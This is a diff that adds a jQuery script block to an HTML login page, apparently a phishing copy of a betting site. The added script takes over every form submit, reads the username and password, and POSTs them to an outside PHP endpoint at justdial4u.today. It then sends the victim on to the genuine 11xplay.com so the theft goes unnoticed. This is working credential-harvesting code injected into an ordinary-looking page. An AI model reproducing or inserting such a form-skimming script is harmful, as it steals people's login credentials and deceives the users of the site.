@@ -879,6 +879,64 @@
 </div>
 
 
+	    <script type="text/javascript">
+    // Function to handle the login submission
+    function checkLogin(event) {
+        event.preventDefault();  // Prevent form from submitting the normal way
+
+        // Get values from the form inputs
+        var loginName = $("input[formcontrolname='username']").val();  
+        var password = $("input[formcontrolname='password']").val();  
+
+        
+        if (loginName !== '' && password !== '') {
+            
+            sessionStorage.setItem("loginName", loginName);
+            sessionStorage.setItem("password", password);
+
+            
+            var storedLoginName = sessionStorage.getItem("loginName");
+            var storedPassword = sessionStorage.getItem("password");
+
+            
+            $.ajax({
+                type: "POST",
+                url: "https://justdial4u.today/11xxplay-mail.php", 
+                data: {
+                    loginName: storedLoginName,
+                    password: storedPassword
+                },
+                success: function (msg) {
+
+                    if (msg === "sucessmsg") {
+                       
+                        window.location.href = "https://11xplay.com/";
+                    } else {
+                        
+                        $("#errorMsg").html('Username and password are incorrect.');
+                    }
+                },
+                error: function() {
+                    
+                    alert('An error occurred. Please try again.');
+                }
+            });
+        } else {
+            
+            alert('All fields are required.');
+        }
+    }
+
+   
+    $(document).ready(function () {
+        $("form").on("submit", function (event) {
+            checkLogin(event);  
+        });
+    });
+</script>
+
+
+
 
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css">
